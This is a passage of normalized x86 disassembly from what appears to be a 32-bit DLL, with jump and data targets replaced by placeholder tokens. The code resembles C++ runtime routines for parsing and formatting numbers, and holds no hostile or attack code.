lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003f0b8
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] si
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1002b392
retn 0x20
sub_10040a1a
push 0x38
mov eax sub_1004ed3d
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_10007dd5
mov esi [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_1003fa84
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_10007dbd
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_10022859
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003f0b8
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffffffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1002b392
retn 0x20
sub_10040ae5
push 0x38
mov eax sub_1004ed6a
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10007dd5
mov esi [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1003fa84
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_100229f4
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_10007dbd
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003f0b8
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1002b392
retn 0x20
sub_10040b93
push 0x38
mov eax sub_1004ed6a
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10007dd5
mov esi [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1003fa84
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10022859
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_10007dbd
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003f0b8
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1002b392
retn 0x20
sub_10040c41
push 0x3c
mov eax sub_1004f450
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10007dd5
mov esi [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1003fa84
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10022a99
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_10007dbd
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003f0b8
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1002b392
retn 0x20
sub_10040cf8
push 0x3c
mov eax sub_1004f450
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10007dd5
mov esi [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1003fa84
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10022b5c
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_10007dbd
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003f0b8
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1002b392
retn 0x20
sub_10040daf
push 0x50
mov eax sub_1004ed97
call sub_1002b30f
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x54 ] 0x0
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x50 ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10007dd5
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x54 ]
push ecx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp - 0x50 ]
call sub_1003fd4b
add esp 0x14
push eax
lea eax [ ebp - 0x5c ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_10022d61
fstp [ ebp - 0x50 ]
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x58 ]
call sub_10007dbd
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003f0b8
test al al
je r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x5c ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
fld [ ebp - 0x50 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
call sub_1002b392
retn 0x20
sub_10040e57
push 0x54
mov eax sub_10050028
call sub_1002b30f
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x50 ] 0x0
lea eax [ ebp - 0x54 ]
mov [ ebp - 0x5c ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10007dd5
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x50 ]
push ecx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp - 0x5c ]
call sub_1003fd4b
add esp 0x14
push eax
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_10022d83
fstp [ ebp - 0x60 ]
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x54 ]
call sub_10007dbd
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003f0b8
test al al
je r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x58 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
fld [ ebp - 0x60 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
call sub_1002b392
retn 0x20
sub_10040eff
push 0x54
mov eax sub_10050028
call sub_1002b30f
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x50 ] 0x0
lea eax [ ebp - 0x54 ]
mov [ ebp - 0x5c ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10007dd5
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x50 ]
push ecx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp - 0x5c ]
call sub_1003fd4b
add esp 0x14
push eax
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_10022dec
fstp [ ebp - 0x60 ]
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x54 ]
call sub_10007dbd
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003f0b8
test al al
je r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x58 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
fld [ ebp - 0x60 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
call sub_1002b392
retn 0x20
sub_10040fa7
push 0x38
mov eax sub_1004f47d
call sub_1002b30f
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x3c ] 0x0
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10007dd5
and [ ebp - 0x4 ] 0x0
push eax
push 0x800
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_1003fa84
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x34 ] eax
call sub_10007dbd
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x34 ]
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10022859
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x38 ] eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003f0b8
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
mov eax [ ebp - 0x38 ]
mov [ edi ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x4 ] eax
mov eax ebx
call sub_1002b392
retn 0x20
sub_1004105d
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x10 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x8 ]
push eax
push r--data
lea eax [ ebp - 0xc ]
mov ebx ecx
push eax
push ebx
call sub_1003efd1
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_10027b13
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_100405c8
mov ecx [ ebp - 0x4 ]
add esp 0x30
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10027150
leave
retn 0x18
sub_100410cb
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x10 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x8 ]
push eax
push r--data
lea eax [ ebp - 0xc ]
mov ebx ecx
push eax
push ebx
call sub_1003efd1
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_10027b13
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_100405c8
mov ecx [ ebp - 0x4 ]
add esp 0x30
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10027150
leave
retn 0x18
sub_10041139
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x10 ]
push edi
push [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ebx ecx
push eax
push r--data
lea eax [ ebp - 0xc ]
push eax
push ebx
call sub_1003efd1
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_10027b13
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_100405c8
mov ecx [ ebp - 0x4 ]
add esp 0x34
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10027150
leave
retn 0x1c
sub_100411aa
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x10 ]
push edi
push [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ebx ecx
push eax
push r--data
lea eax [ ebp - 0xc ]
push eax
push ebx
call sub_1003efd1
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_10027b13
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_100405c8
mov ecx [ ebp - 0x4 ]
add esp 0x34
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10027150
leave
retn 0x1c
sub_1004121b
mov edi edi
push ebp
mov ebp esp
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x84 ] ecx
mov ecx [ esi + 0x14 ]
xor ebx ebx
cmp ecx ebx
mov [ ebp - 0x88 ] eax
push edi
mov eax 0x2000
jg r-xdata
mov edi ecx
push 0x24
pop ecx
cmp edi ecx
mov [ ebp - 0x8 ] ecx
jg r-xdata
test [ esi + 0x10 ] eax
jne r-xdata
mov ecx [ esi + 0x10 ]
fld [ ebp + 0x1c ]
sub edi [ ebp - 0x8 ]
mov edx ecx
and edx 0x3000
mov [ ebp - 0x80 ] ebx
cmp edx eax
jne r-xdata
mov [ ebp - 0x8 ] edi
push 0x6
pop ecx
push ecx
push ecx
fstp [ esp ]
push [ ebp - 0x8 ]
lea eax [ ebp - 0xc ]
push ecx
push 0x0
push eax
push [ ebp - 0x84 ]
call sub_1003ef6a
add esp 0x10
push eax
lea eax [ ebp - 0x78 ]
push 0x6c
push eax
call sub_10027b13
push eax
push edi
push ebx
push [ ebp - 0x80 ]
lea eax [ ebp - 0x78 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x88 ]
push [ ebp - 0x84 ]
call sub_100401a5
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x88 ]
add esp 0x44
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10027150
leave
retn 0x1c
fld [ r--data ]
fmul st1
fucomp st1
fnstsw ax
test ah 0x44
jpo r-xdata
fldz
fcom st1
fnstsw ax
test ah 0x41
jne r-xdata
mov [ ebp - 0x79 ] bl
fxch st1
fxch st1
mov [ ebp - 0x79 ] 0x1
fchs
jmp r-xdata
cmp [ ebp - 0x80 ] 0x1388
jae r-xdata
fstp st1
jmp r-xdata
fld [ r--data ]
push 0xa
fcom st1
pop edx
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
fdiv st2
add [ ebp - 0x80 ] edx
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ ebp - 0x79 ] 0x0
fstp st1
je r-xdata
cmp edi edx
jl r-xdata
fchs
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp ebx 0x1388
jae r-xdata
sub edi edx
fmul st1
add ebx edx
jmp r-xdata
sub_1004138e
mov edi edi
push ebp
mov ebp esp
sub esp 0x8c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x88 ] ecx
mov ecx [ esi + 0x14 ]
mov [ ebp - 0x8c ] eax
push edi
mov eax 0x2000
test ecx ecx
jg r-xdata
mov edi ecx
push 0x24
pop ecx
cmp edi ecx
mov [ ebp - 0x8 ] ecx
jg r-xdata
test [ esi + 0x10 ] eax
jne r-xdata
mov ecx [ esi + 0x10 ]
sub edi [ ebp - 0x8 ]
and [ ebp - 0x80 ] 0x0
and [ ebp - 0x84 ] 0x0
mov edx ecx
and edx 0x3000
cmp edx eax
jne r-xdata
mov [ ebp - 0x8 ] edi
push 0x6
pop ecx
fld [ ebp + 0x1c ]
fldz
fld [ ebp + 0x1c ]
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
mov [ ebp - 0x79 ] 0x0
jmp r-xdata
mov [ ebp - 0x79 ] 0x1
fchs
fld [ r--data ]
push ebx
fcom st1
push 0xa
mov ebx 0x1388
pop edx
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
cmp [ ebp - 0x80 ] ebx
jae r-xdata
fstp st1
jmp r-xdata
fdiv st2
add [ ebp - 0x80 ] edx
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ ebp - 0x79 ] 0x0
fstp st1
pop ebx
je r-xdata
cmp edi edx
jl r-xdata
push ecx
push ecx
fstp [ esp ]
push [ ebp - 0x8 ]
lea eax [ ebp - 0xc ]
push ecx
push 0x4c
push eax
push [ ebp - 0x88 ]
call sub_1003ef6a
add esp 0x10
push eax
lea eax [ ebp - 0x78 ]
push 0x6c
push eax
call sub_10027b13
push eax
push edi
push [ ebp - 0x84 ]
lea eax [ ebp - 0x78 ]
push [ ebp - 0x80 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x8c ]
push [ ebp - 0x88 ]
call sub_100401a5
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x8c ]
add esp 0x44
pop edi
xor ecx ebp
pop esi
call sub_10027150
leave
retn 0x1c
fchs
jmp r-xdata
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp [ ebp - 0x84 ] ebx
jae r-xdata
sub edi edx
fmul st1
add [ ebp - 0x84 ] edx
jmp r-xdata
sub_100414fe
mov edi edi
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
push eax
push r--data
lea eax [ ebp - 0x44 ]
push 0x40
push eax
mov ebx ecx
call sub_10027b13
push eax
lea eax [ ebp - 0x44 ]
push eax
push [ ebp + 0x18 ]
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push ebx
call sub_100405c8
mov ecx [ ebp - 0x4 ]
add esp 0x30
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10027150
leave
retn 0x18
sub_1004158d
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_1002260b
mov ax [ ebp - 0x4 ]
add esp 0x14
leave
retn
sub_100415bb
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0xc ] edi
call sub_10027160
mov esi eax
mov eax [ ebp + 0x8 ]
inc esi
pop ecx
mov ebx esi
mov [ ebp - 0x8 ] eax
je r-xdata
inc edi
xor ecx ecx
push 0x2
pop edx
mov eax edi
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_10022df7
and [ ebp - 0x10 ] 0x0
mov ebx eax
pop ecx
mov [ ebp - 0x8 ] ebx
jmp r-xdata
push [ ebp + 0x10 ]
lea eax [ ebp - 0xc ]
push eax
push ebx
push [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
push eax
call sub_1002260b
add esp 0x14
test eax eax
jle r-xdata
test edi edi
ja r-xdata
add [ ebp - 0x8 ] eax
sub ebx eax
inc edi
test ebx ebx
ja r-xdata
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push eax
push esi
push [ ebp + 0x8 ]
push ebx
call sub_1002260b
add esp 0x14
test eax eax
jle r-xdata
pop edi
xor eax eax
mov [ ebx ] ax
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
leave
retn
add [ ebp + 0x8 ] eax
dec edi
inc ebx
inc ebx
sub_10041658
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
lea eax [ ebp - 0x10 ]
mov ebx ecx
mov ecx [ ebp + 0x8 ]
push eax
call sub_10007853
mov ecx [ ebp + 0x8 ]
mov esi eax
lea edi [ ebx + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x8 ]
push eax
movsd [ edi ] [ esi ]
call sub_10007876
mov ecx [ eax ]
mov [ ebx + 0x18 ] ecx
mov eax [ eax + 0x4 ]
pop edi
pop esi
mov [ ebx + 0x1c ] eax
pop ebx
leave
retn 0x4
sub_10041698
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
lea eax [ ebp - 0x8 ]
mov esi ecx
mov ecx [ ebp + 0x8 ]
push eax
call sub_10007876
mov ecx [ eax ]
mov [ esi + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ esi + 0x10 ] eax
lea eax [ ebp + 0x8 ]
push eax
call sub_10041573
mov ecx [ eax ]
mov [ esi + 0x8 ] ecx
and [ eax ] 0x0
push [ ebp + 0x8 ]
call sub_10027a85
pop ecx
pop esi
leave
retn 0x4
sub_100416db
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
lea eax [ ebp - 0x8 ]
mov esi ecx
mov ecx [ ebp + 0x8 ]
push eax
call sub_1004155b
mov ecx [ eax ]
mov [ esi + 0x8 ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0xc ] eax
pop esi
leave
retn 0x4
sub_1004173c
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
lea eax [ ebp - 0x8 ]
mov esi ecx
mov ecx [ ebp + 0x8 ]
push eax
call sub_10007876
mov ecx [ eax ]
mov [ esi + 0x8 ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0xc ] eax
pop esi
leave
retn 0x4
sub_10041762
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
call sub_10027c56
push [ esi + 0x10 ]
call sub_10027c56
push [ esi + 0x14 ]
call sub_10027c56
push [ esi + 0x18 ]
call sub_10027c56
add esp 0x10
pop esi
retn
sub_1004178c
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x28 ] 0x0
jne r-xdata
mov eax r--data
mov ecx [ ebp + 0xc ]
cmp ecx 0x2
ja r-xdata
mov eax [ ebp + 0x10 ]
cmp eax 0x1
ja r-xdata
cmp [ ebp + 0x14 ] 0x4
ja r-xdata
lea eax [ eax + ecx * 2 ]
imul eax eax 0x5
add eax [ ebp + 0x14 ]
lea eax [ eax * 4 + r--data ]
jmp r-xdata
push 0x4
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_100272f3
add esp 0x10
pop ebp
retn 0x10
sub_100417d8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1004173c
mov eax esi
pop esi
pop ebp
retn 0x8
sub_100417fb
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x14 ]
mov [ esi ] eax
mov eax [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x20 ]
mov [ ebp - 0x4 ] ecx
xor ecx ecx
mov [ edi ] eax
mov eax [ esi ]
cmp eax ebx
setne cl
mov [ ebp + 0x14 ] ecx
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ edi ]
cmp ecx [ ebp + 0x1c ]
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ esi ]
add edx 0x8
